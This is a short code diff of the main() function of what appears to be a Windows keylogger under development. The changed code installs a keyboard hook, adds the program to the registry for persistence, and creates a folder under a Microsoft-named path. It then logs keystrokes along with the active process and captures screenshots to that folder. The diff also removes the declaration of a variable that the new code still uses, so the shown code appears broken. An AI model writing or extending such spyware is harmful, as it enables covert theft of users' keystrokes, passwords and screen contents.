@@ -4,25 +4,26 @@
 #include "sys.h"
 #include "encrypt.h"
 
+#define DEBUG
+
 int main() {
+#ifdef DEBUG
 
-  WCHAR path[0xFF];
-  GetModuleFileNameW(nullptr, path, MAX_PATH);
+#endif
 
-  std::wcout << path;
+#ifndef DEBUG
+  Crypt::GenerateKeys();
+  KeyHook::InstallHook();
+  Sys::AddToRegistry(path);
 
-  crypto::GenerateKeys();
-  key_hook::InstallHook();
-  sys::AddToRegistry("blxr");
+  Stream::MakeDir(Stream::GetPath("\\Microsoft\\blxr"));
+  Stream::MakeFile();
+  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);
 
-  stream::MakeDir(stream::GetPath("\\Microsoft\\blxr"));
-  stream::MakeFile();
-  stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);
+  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\blxr\)"), "Screen.jpeg");
 
-  screen::CaptureScreen(stream::GetPath(R"(\Microsoft\blxr\)"), "screen.jpeg");
-
-  key_hook::HandleMessage(true);
-
+  KeyHook::HandleMessage(true);
+#endif
   return 0;
 }
 
